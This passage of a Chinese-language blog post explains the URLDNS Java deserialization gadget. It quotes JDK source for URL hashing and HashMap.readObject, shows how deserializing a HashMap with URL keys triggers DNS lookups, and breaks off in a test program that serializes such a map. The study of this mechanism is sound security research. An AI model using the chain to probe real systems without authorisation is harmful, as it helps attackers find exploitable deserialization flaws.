&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">hostsEqual&lt;/span>&lt;span style="color:#f92672">(&lt;/span>URL u1&lt;span style="color:#f92672">,&lt;/span> URL u2&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
InetAddress a1 &lt;span style="color:#f92672">=&lt;/span> getHostAddress&lt;span style="color:#f92672">(&lt;/span>u1&lt;span style="color:#f92672">);&lt;/span>
InetAddress a2 &lt;span style="color:#f92672">=&lt;/span> getHostAddress&lt;span style="color:#f92672">(&lt;/span>u2&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">synchronized&lt;/span> InetAddress &lt;span style="color:#a6e22e">getHostAddress&lt;/span>&lt;span style="color:#f92672">(&lt;/span>URL u&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>u&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">hostAddress&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> u&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">hostAddress&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
String host &lt;span style="color:#f92672">=&lt;/span> u&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getHost&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>host &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">||&lt;/span> host&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isEmpty&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
u&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">hostAddress&lt;/span> &lt;span style="color:#f92672">=&lt;/span> InetAddress&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getByName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>host&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>UnknownHostException ex&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>SecurityException se&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> u&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">hostAddress&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>同样的URL类中的hashCode也会触发DNS请求，通过getHostAddress获取到IP地址，需要注意的是其中hashCode会被缓存&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">synchronized&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">hashCode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>hashCode &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>1&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> hashCode&lt;span style="color:#f92672">;&lt;/span>
hashCode &lt;span style="color:#f92672">=&lt;/span> handler&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">hashCode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> hashCode&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">hashCode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>URL u&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> h &lt;span style="color:#f92672">=&lt;/span> 0&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">// Generate the protocol part.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> String protocol &lt;span style="color:#f92672">=&lt;/span> u&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getProtocol&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>protocol &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
h &lt;span style="color:#f92672">+=&lt;/span> protocol&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">hashCode&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">// Generate the host part.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> InetAddress addr &lt;span style="color:#f92672">=&lt;/span> getHostAddress&lt;span style="color:#f92672">(&lt;/span>u&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>addr &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
h &lt;span style="color:#f92672">+=&lt;/span> addr&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">hashCode&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
String host &lt;span style="color:#f92672">=&lt;/span> u&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getHost&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>host &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
h &lt;span style="color:#f92672">+=&lt;/span> host&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">toLowerCase&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">hashCode&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>通过调用URL类的equals和hashCode方法即可触发DNS请求&lt;/p>
&lt;h4 id="hashmap原理">HashMap原理&lt;/h4>
&lt;p>&lt;strong>数据结构&lt;/strong>&lt;/p>
&lt;p>HashMap采用数组+链表方式存储键值对，其中链表为单向链表&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">transient&lt;/span> Node&lt;span style="color:#f92672">&amp;lt;&lt;/span>K&lt;span style="color:#f92672">,&lt;/span>V&lt;span style="color:#f92672">&amp;gt;[]&lt;/span> table&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Node&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>K&lt;span style="color:#f92672">,&lt;/span>V&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Map&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">Entry&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>K&lt;span style="color:#f92672">,&lt;/span>V&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> hash&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">final&lt;/span> K key&lt;span style="color:#f92672">;&lt;/span>
V value&lt;span style="color:#f92672">;&lt;/span>
Node&lt;span style="color:#f92672">&amp;lt;&lt;/span>K&lt;span style="color:#f92672">,&lt;/span>V&lt;span style="color:#f92672">&amp;gt;&lt;/span> next&lt;span style="color:#f92672">;&lt;/span>
Node&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> hash&lt;span style="color:#f92672">,&lt;/span> K key&lt;span style="color:#f92672">,&lt;/span> V value&lt;span style="color:#f92672">,&lt;/span> Node&lt;span style="color:#f92672">&amp;lt;&lt;/span>K&lt;span style="color:#f92672">,&lt;/span>V&lt;span style="color:#f92672">&amp;gt;&lt;/span> next&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">hash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> hash&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> key&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> value&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">next&lt;/span> &lt;span style="color:#f92672">=&lt;/span> next&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>默认情况下java中的HashMap大小只有16，当产生hash冲突时，就把它插入到链表中的下一个元素，在取出元素时，首先计算hash，根据hash找到对应的链表，而后遍历链表获取到value。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> DEFAULT_INITIAL_CAPACITY &lt;span style="color:#f92672">=&lt;/span> 1 &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> 4&lt;span style="color:#f92672">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以用如下图
&lt;img alt="" src="https://www.ch35tnut.site/images/research/web/java-deserialization/urldns.zh-cn.assets/1.webp" />&lt;/p>
&lt;p>HashMap重写了readObject方法，反序列化HashMap数据时会调用重写的readObject方法，代码如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">readObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>java&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">ObjectInputStream&lt;/span> s&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#66d9ef">throws&lt;/span> IOException&lt;span style="color:#f92672">,&lt;/span> ClassNotFoundException &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// Read in the threshold (ignored), loadfactor, and any hidden stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> s&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">defaultReadObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
reinitialize&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>loadFactor &lt;span style="color:#f92672">&amp;lt;=&lt;/span> 0 &lt;span style="color:#f92672">||&lt;/span> Float&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isNaN&lt;/span>&lt;span style="color:#f92672">(&lt;/span>loadFactor&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> InvalidObjectException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Illegal load factor: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
loadFactor&lt;span style="color:#f92672">);&lt;/span>
s&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">readInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// Read and ignore number of buckets
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> mappings &lt;span style="color:#f92672">=&lt;/span> s&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">readInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// Read number of mappings (size)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>mappings &lt;span style="color:#f92672">&amp;lt;&lt;/span> 0&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> InvalidObjectException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Illegal mappings count: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
mappings&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>mappings &lt;span style="color:#f92672">&amp;gt;&lt;/span> 0&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// (if zero, use defaults)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// Size the table using given load factor only if within
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// range of 0.25...4.0
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">float&lt;/span> lf &lt;span style="color:#f92672">=&lt;/span> Math&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">min&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Math&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">max&lt;/span>&lt;span style="color:#f92672">(&lt;/span>0&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">25f&lt;/span>&lt;span style="color:#f92672">,&lt;/span> loadFactor&lt;span style="color:#f92672">),&lt;/span> 4&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">0f&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">float&lt;/span> fc &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">float&lt;/span>&lt;span style="color:#f92672">)&lt;/span>mappings &lt;span style="color:#f92672">/&lt;/span> lf &lt;span style="color:#f92672">+&lt;/span> 1&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">0f&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> cap &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">((&lt;/span>fc &lt;span style="color:#f92672">&amp;lt;&lt;/span> DEFAULT_INITIAL_CAPACITY&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">?&lt;/span>
DEFAULT_INITIAL_CAPACITY &lt;span style="color:#f92672">:&lt;/span>
&lt;span style="color:#f92672">(&lt;/span>fc &lt;span style="color:#f92672">&amp;gt;=&lt;/span> MAXIMUM_CAPACITY&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">?&lt;/span>
MAXIMUM_CAPACITY &lt;span style="color:#f92672">:&lt;/span>
tableSizeFor&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span>&lt;span style="color:#f92672">)&lt;/span>fc&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#66d9ef">float&lt;/span> ft &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">float&lt;/span>&lt;span style="color:#f92672">)&lt;/span>cap &lt;span style="color:#f92672">*&lt;/span> lf&lt;span style="color:#f92672">;&lt;/span>
threshold &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">((&lt;/span>cap &lt;span style="color:#f92672">&amp;lt;&lt;/span> MAXIMUM_CAPACITY &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> ft &lt;span style="color:#f92672">&amp;lt;&lt;/span> MAXIMUM_CAPACITY&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">?&lt;/span>
&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span>&lt;span style="color:#f92672">)&lt;/span>ft &lt;span style="color:#f92672">:&lt;/span> Integer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">MAX_VALUE&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// Check Map.Entry[].class since it&amp;#39;s the nearest public type to
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// what we&amp;#39;re actually creating.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> SharedSecrets&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getJavaObjectInputStreamAccess&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">checkArray&lt;/span>&lt;span style="color:#f92672">(&lt;/span>s&lt;span style="color:#f92672">,&lt;/span> Map&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">Entry&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> cap&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#a6e22e">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">({&lt;/span>&lt;span style="color:#e6db74">&amp;#34;rawtypes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#e6db74">&amp;#34;unchecked&amp;#34;&lt;/span>&lt;span style="color:#f92672">})&lt;/span>
Node&lt;span style="color:#f92672">&amp;lt;&lt;/span>K&lt;span style="color:#f92672">,&lt;/span>V&lt;span style="color:#f92672">&amp;gt;[]&lt;/span> tab &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Node&lt;span style="color:#f92672">&amp;lt;&lt;/span>K&lt;span style="color:#f92672">,&lt;/span>V&lt;span style="color:#f92672">&amp;gt;[])&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> Node&lt;span style="color:#f92672">[&lt;/span>cap&lt;span style="color:#f92672">];&lt;/span>
table &lt;span style="color:#f92672">=&lt;/span> tab&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">// Read the keys and values, and put the mappings in the HashMap
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> 0&lt;span style="color:#f92672">;&lt;/span> i &lt;span style="color:#f92672">&amp;lt;&lt;/span> mappings&lt;span style="color:#f92672">;&lt;/span> i&lt;span style="color:#f92672">++)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;unchecked&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
K key &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>K&lt;span style="color:#f92672">)&lt;/span> s&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#a6e22e">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;unchecked&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
V value &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>V&lt;span style="color:#f92672">)&lt;/span> s&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
putVal&lt;span style="color:#f92672">(&lt;/span>hash&lt;span style="color:#f92672">(&lt;/span>key&lt;span style="color:#f92672">),&lt;/span> key&lt;span style="color:#f92672">,&lt;/span> value&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以知道，readObject方法会获取有多少个数据，而后进行通过for循环循环从数据流中读取对象信息，并通过putVal方法加入到HashMap中，其中键为&lt;code>hash(key)&lt;/code>，也就是会尝试调用key对应类的hashCode方法计算hash值。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">hash&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Object key&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> h&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">(&lt;/span>key &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">?&lt;/span> 0 &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#f92672">(&lt;/span>h &lt;span style="color:#f92672">=&lt;/span> key&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">hashCode&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">^&lt;/span> &lt;span style="color:#f92672">(&lt;/span>h &lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> 16&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果key对象为URL类，通过前面我们知道URL.hashCode方法会触发DNS请求，这也是URLDNS的原理。&lt;/p>
&lt;p>&lt;em>以上代码来源于JDK 12.0.1&lt;/em>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://cloud.tencent.com/developer/article/1167574" target="_blank">https://cloud.tencent.com/developer/article/1167574&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://anmolsehgal.medium.com/java-hashmap-internal-implementation-21597e1efec3" target="_blank">https://anmolsehgal.medium.com/java-hashmap-internal-implementation-21597e1efec3&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>实际测试&lt;/strong>&lt;/p>
&lt;p>使用如下代码进行测试&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">urltest&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> IOException&lt;span style="color:#f92672">,&lt;/span> ClassNotFoundException &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;hello &amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
URL u &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> URL&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://www.baidu.com/1&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
URL u1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> URL&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://www.aliyun.com/1&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
HashMap&lt;span style="color:#f92672">&amp;lt;&lt;/span>URL&lt;span style="color:#f92672">,&lt;/span>String&lt;span style="color:#f92672">&amp;gt;&lt;/span> map &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> HashMap&lt;span style="color:#f92672">&amp;lt;&lt;/span>URL&lt;span style="color:#f92672">,&lt;/span>String&lt;span style="color:#f92672">&amp;gt;();&lt;/span>
map&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>u&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
map&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>u1&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
FileOutputStream fos &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> FileOutputStream&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;object&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
ObjectOutputStream os &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ObjectOutputStream&lt;span style="color:#f92672">(&lt;/span>fos&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">//writeObject()方法将myObj对象写入object文件
